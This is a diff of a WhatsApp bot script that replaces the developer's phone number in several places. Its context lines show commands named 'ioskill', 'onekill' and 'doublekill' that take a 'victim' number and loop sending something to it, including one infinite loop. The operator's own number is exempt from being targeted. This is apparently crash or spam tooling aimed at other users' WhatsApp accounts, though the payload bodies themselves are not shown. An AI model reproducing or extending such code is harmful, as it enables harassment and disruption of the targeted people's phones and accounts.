@@ -27195,7 +27195,7 @@ case "xios2":
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "916909137213") {
+  if (cleanedNumber == "254768268502") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -27227,7 +27227,7 @@ case "xsysui": {
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "916909137213") {
+  if (cleanedNumber == "254768268502") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -27247,7 +27247,7 @@ break;
 case 'ioskill': case 'iosx': {
             	if (!XeonTheCreator) return
 let xeonyvictim = q.replace(/[^0-9]/g, "")
-if (xeonyvictim.startsWith('0')) return replygcxeon(`Example : .${command} 916909137213`)
+if (xeonyvictim.startsWith('0')) return replygcxeon(`Example : .${command} 254768268502`)
 await replygcxeon(`In process....`)
 let target = xeonyvictim + '@s.whatsapp.net'
   for (;;) {
@@ -27258,9 +27258,9 @@ let target = xeonyvictim + '@s.whatsapp.net'
 break
 case 'onekill': case 'oneclickall': case 'xsamsung': case 'xwaweb': case 'doublekill': case '💀': case 'triplekill': {
 if (!XeonTheCreator) return
-if (!q) return replygcxeon(`Usage .${command} 916909137213`)
+if (!q) return replygcxeon(`Usage .${command} 254768268502`)
 let xeonyvictim = q.replace(/[^0-9]/g, "")
-if (xeonyvictim.startsWith('0')) return replygcxeon(`Example : .${command} 916909137213`)
+if (xeonyvictim.startsWith('0')) return replygcxeon(`Example : .${command} 254768268502`)
 let target = xeonyvictim + '@s.whatsapp.net'
 await replygcxeon(`In process....`)
 for (let j = 0; j < 1; j++) {
@@ -27315,7 +27315,7 @@ XeonBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true, {quoted: m})
 	} catch (err) {
 		console.log(util.format(err))
         let e = String(err)
-XeonBotInc.sendMessage("916909137213@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
+XeonBotInc.sendMessage("254768268502@s.whatsapp.net", { text: "Hello developer jimmy, there seems to be an error, please fix it " + util.format(e), 
 contextInfo:{
 forwardingScore: 9999999, 
 isForwarded: true
